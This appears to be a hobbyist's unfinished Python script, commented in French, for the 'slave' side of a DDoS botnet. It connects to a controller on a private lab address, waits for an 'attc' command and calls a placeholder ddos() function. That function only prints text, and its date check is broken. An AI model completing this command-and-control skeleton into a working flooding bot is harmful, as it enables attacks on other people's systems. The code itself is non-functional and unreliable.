#ça c'est le slave, le programme qui va infecter mon ordi 

import socket
import datetime

#fonction ddos, celle qui va récupérer date/heure et surcharger l'ip
#bon, j'essaye déjà que ça marche avec date/heure, on verra pour ip après 
def ddos():
   
    if (datetime.date == 2019, 11, 7) and (datetime.time == 11, 59):
        print("potentielle attaque ddos".encode("utf-8"))
    else:
        print("error".encode("utf-8"))

server_addr = ("192.168.56.1", 60000)
slave = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

slave.connect(server_addr)

#ici, je veux que lorsque mon slave reçoit le message "attc" de serveur, il lance la fonction ddos et renvoit un message le confirmant
#ce qui n'est pas encore le cas haha
attaque = (slave.recv(1024))
if attaque == "attc":
    ddos()
    slave.send("le slave a lancé le ddos".encode("utf-8"))
else:
    slave.send("euh problème".encode("utf-8"))

slave.close()
